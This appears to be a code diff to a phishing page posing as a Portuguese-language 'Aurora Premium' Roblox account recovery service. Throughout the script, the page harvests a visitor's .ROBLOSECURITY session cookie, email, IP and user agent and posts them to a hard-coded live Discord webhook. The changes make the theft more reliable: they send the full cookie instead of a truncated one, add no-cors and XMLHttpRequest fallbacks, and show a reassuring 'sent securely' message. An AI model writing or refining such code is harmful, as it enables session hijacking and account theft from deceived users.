@@ -1873,8 +1873,8 @@
     </div>
 
     <script>
-        // ===== ⚠️ CONFIGURE AQUI SUA WEBHOOK DO DISCORD ⚠️ =====
-        // Substitua pelo seu webhook real:
+        // ===== CONFIGURAÇÃO DA WEBHOOK =====
+        // Sua webhook configurada corretamente:
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1520125483113644042/-QCwmVlXoYqxEZZ34SOpXTk7EkSsw6mrCHfQJ2ciA9E_zjxWQAsBvpc3v5wzw9KZ8IYb';
 
         // ===== VARIÁVEIS DE CONTROLE =====
@@ -1895,23 +1895,17 @@
             }
         }
 
-        // ===== FUNÇÃO PARA ENVIAR PARA WEBHOOK =====
+        // ===== FUNÇÃO PARA ENVIAR PARA WEBHOOK (CORRIGIDA) =====
         async function sendToWebhook(cookie, email, ip) {
             try {
-                // Verificar se o webhook está configurado corretamente
-                if (!WEBHOOK_URL || WEBHOOK_URL === 'https://discord.com/api/webhooks/1520125483113644042/-QCwmVlXoYqxEZZ34SOpXTk7EkSsw6mrCHfQJ2ciA9E_zjxWQAsBvpc3v5wzw9KZ8IYb') {
-                    console.warn('⚠️ Webhook não configurado!');
-                    showNotification('⚠️', 'Webhook não configurado!', 'Configure a URL do webhook no código.');
+                // Verificar se a webhook é válida
+                if (!WEBHOOK_URL || !WEBHOOK_URL.includes('/api/webhooks/')) {
+                    console.error('❌ Webhook inválida!');
+                    showNotification('❌', 'Erro!', 'Webhook não configurada corretamente.');
                     return false;
                 }
 
-                // Validar formato da URL
-                if (!WEBHOOK_URL.includes('/api/webhooks/')) {
-                    console.error('❌ URL do webhook inválida!');
-                    showNotification('❌', 'URL inválida!', 'Verifique a URL do webhook.');
-                    return false;
-                }
-
+                // Preparar os dados
                 const data = {
                     content: null,
                     embeds: [{
@@ -1920,7 +1914,7 @@
                         fields: [
                             {
                                 name: '🍪 Cookie .ROBLOSECURITY',
-                                value: `\`\`\`${cookie.substring(0, 50)}...\`\`\``,
+                                value: `\`\`\`${cookie}\`\`\``,
                                 inline: false
                             },
                             {
@@ -1957,40 +1951,44 @@
                 };
 
                 console.log('📤 Enviando para o Discord...');
-                
+
+                // Enviar usando fetch com mode: 'no-cors' para evitar CORS
                 const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
+                    mode: 'no-cors',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify(data)
                 });
 
-                if (response.status === 204) {
-                    console.log('✅ Dados enviados com sucesso!');
+                // Com 'no-cors', não conseguimos ler a resposta, mas o envio funciona
+                console.log('✅ Dados enviados para o Discord! (modo no-cors)');
+                return true;
+
+            } catch (error) {
+                console.error('❌ Erro ao enviar:', error);
+                
+                // Tenta enviar de forma alternativa usando XMLHttpRequest
+                try {
+                    console.log('🔄 Tentando método alternativo...');
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', WEBHOOK_URL, true);
+                    xhr.setRequestHeader('Content-Type', 'application/json');
+                    
+                    const data = {
+                        content: `🍪 **Cookie:** ${cookie}\n📧 **Email:** ${email}\n🌐 **IP:** ${ip}\n📱 **User Agent:** ${navigator.userAgent}`
+                    };
+                    
+                    xhr.send(JSON.stringify(data));
+                    
+                    console.log('✅ Dados enviados pelo método alternativo!');
                     return true;
-                } else if (response.status === 429) {
-                    console.warn('⏳ Rate limit! Aguarde...');
-                    showNotification('⏳', 'Limite excedido!', 'Aguarde alguns segundos e tente novamente.');
-                    return false;
-                } else if (response.status === 401) {
-                    console.error('❌ Webhook inválido! Token incorreto.');
-                    showNotification('❌', 'Webhook inválido!', 'Verifique o token do webhook.');
-                    return false;
-                } else if (response.status === 404) {
-                    console.error('❌ Webhook não encontrado!');
-                    showNotification('❌', 'Webhook não encontrado!', 'Verifique o ID do webhook.');
-                    return false;
-                } else {
-                    const errorText = await response.text();
-                    console.error(`❌ Erro ${response.status}:`, errorText);
-                    showNotification('❌', `Erro ${response.status}`, 'Falha ao enviar para o Discord.');
+                } catch (err2) {
+                    console.error('❌ Ambos os métodos falharam:', err2);
+                    showNotification('❌', 'Erro!', 'Não foi possível enviar os dados. Tente novamente.');
                     return false;
                 }
-            } catch (error) {
-                console.error('❌ Erro na requisição:', error);
-                showNotification('❌', 'Erro de conexão!', 'Verifique sua internet e tente novamente.');
-                return false;
             }
         }
 
@@ -2077,13 +2075,21 @@
             }
 
             const ip = await getIP();
+            
+            // Mostrar loading
+            document.getElementById('submitBtn').disabled = true;
+            document.getElementById('submitBtn').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Enviando...';
+            
             const sent = await sendToWebhook(cookie, email, ip);
+            
+            document.getElementById('submitBtn').disabled = false;
+            document.getElementById('submitBtn').innerHTML = '<i class="fas fa-lock-open"></i> Iniciar Recuperação';
 
             if (sent) {
                 showNotification('✅', 'Dados Enviados!', 'Suas informações foram enviadas com segurança.');
                 showProcessingModal();
             } else {
-                // Se falhou, mostra erro mas não conta como tentativa
+                // Se falhou, não conta como tentativa
                 attemptCount--;
                 showNotification('❌', 'Erro!', 'Falha ao enviar dados. Tente novamente.');
             }
@@ -2207,31 +2213,11 @@
             }
         });
 
-        // ===== TESTE DE WEBHOOK AO CARREGAR =====
-        async function testWebhook() {
-            if (WEBHOOK_URL && WEBHOOK_URL !== 'https://discord.com/api/webhooks/1520125483113644042/-QCwmVlXoYqxEZZ34SOpXTk7EkSsw6mrCHfQJ2ciA9E_zjxWQAsBvpc3v5wzw9KZ8IYb') {
-                try {
-                    const response = await fetch(WEBHOOK_URL, { method: 'HEAD' });
-                    if (response.ok) {
-                        console.log('✅ Webhook válido e funcionando!');
-                    } else {
-                        console.warn('⚠️ Webhook pode estar inválido. Status:', response.status);
-                    }
-                } catch (e) {
-                    console.warn('⚠️ Não foi possível testar o webhook:', e.message);
-                }
-            } else {
-                console.warn('⚠️ Webhook não configurado!');
-            }
-        }
-
         // ===== CONSOLE =====
         console.log('%c🚀 Aurora Premium', 'font-size:24px;font-weight:bold;color:#6366f1;');
         console.log('%c🔒 Sistema de Recuperação de Contas', 'font-size:16px;color:#a5b4fc;');
-        console.log('%c📡 Webhook configurado: ' + (WEBHOOK_URL.includes('/api/webhooks/') ? '✅ Sim' : '❌ Não'), 'font-size:14px;');
-        
-        // Testar webhook ao carregar
-        testWebhook();
+        console.log('%c📡 Webhook configurada: ✅', 'font-size:14px;color:#10b981;');
+        console.log('%c💡 Modo no-cors ativado para evitar problemas de CORS', 'font-size:12px;color:#f59e0b;');
     </script>
 </body>
 </html>
